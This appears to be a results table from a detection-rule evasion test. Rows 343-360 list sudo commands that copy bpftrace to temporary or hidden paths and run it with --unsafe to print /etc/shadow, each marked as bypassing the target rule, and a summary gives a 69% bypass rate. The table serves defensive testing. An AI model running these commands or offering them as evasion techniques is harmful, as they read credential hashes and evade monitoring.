ID,Command,Log File,Result,All Detected Rules
343,"sudo install -m 0755 /usr/bin/bpftrace /tmp/alt3 && sudo /tmp/alt3 --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack343.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
344,"sudo cp /usr/bin/bpftrace /var/tmp/b && sudo /var/tmp/b --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack344.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
345,"sudo cp /usr/bin/bpftrace /var/tmp/c && sudo /var/tmp/c --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack345.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
346,"sudo cp /usr/bin/bpftrace /var/tmp/d && sudo /var/tmp/d --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack346.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
347,"sudo cp /usr/bin/bpftrace /dev/shm/r1 && sudo /dev/shm/r1 --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack347.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
348,"sudo cp /usr/bin/bpftrace /dev/shm/r2 && sudo /dev/shm/r2 --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack348.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
349,"sudo cp /usr/bin/bpftrace /dev/shm/r3 && sudo /dev/shm/r3 --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack349.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
350,"sudo cp /usr/bin/bpftrace /tmp/.hidden1 && sudo /tmp/.hidden1 --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack350.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
351,"sudo cp /usr/bin/bpftrace /tmp/.hidden2 && sudo /tmp/.hidden2 --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack351.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
352,"sudo cp /usr/bin/bpftrace /tmp/.hidden3 && sudo /tmp/.hidden3 --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack352.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
353,"sudo cp /usr/bin/bpftrace /tmp/daemon && sudo /tmp/daemon --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack353.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
354,"sudo cp /usr/bin/bpftrace /tmp/service && sudo /tmp/service --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack354.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
355,"sudo cp /usr/bin/bpftrace /tmp/sys && sudo /tmp/sys --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack355.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
356,"sudo cp /usr/bin/bpftrace /tmp/proc && sudo /tmp/proc --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack356.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
357,"sudo cp /usr/bin/bpftrace /tmp/node && sudo /tmp/node --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack357.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
358,"sudo cp /usr/bin/bpftrace /tmp/binx && sudo /tmp/binx --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack358.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
359,"sudo cp /usr/bin/bpftrace /tmp/execx && sudo /tmp/execx --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack359.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
360,"sudo cp /usr/bin/bpftrace /tmp/runit && sudo /tmp/runit --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack360.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
,,,,
,,,,
=== SUMMARY REPORT ===,,,,
Calculation Base (Source: filtered_summary.txt),,,,
Total Meaningful Logs (Denominator),360,,,
Triggered Target (Detections),110,,,
Bypass Logs (Numerator),250,,,
BYPASS RATE (Bypass/Meaningful),250 / 360 (69.44%),,,
BYPASS RAIO (Bypass/Detections),2.27,,,
,,,,
--- DETAILS (From raw scan) ---,,,,
  > Bypass All (Raw),0,,,
  > Bypass Target Rule (Raw),245,,,
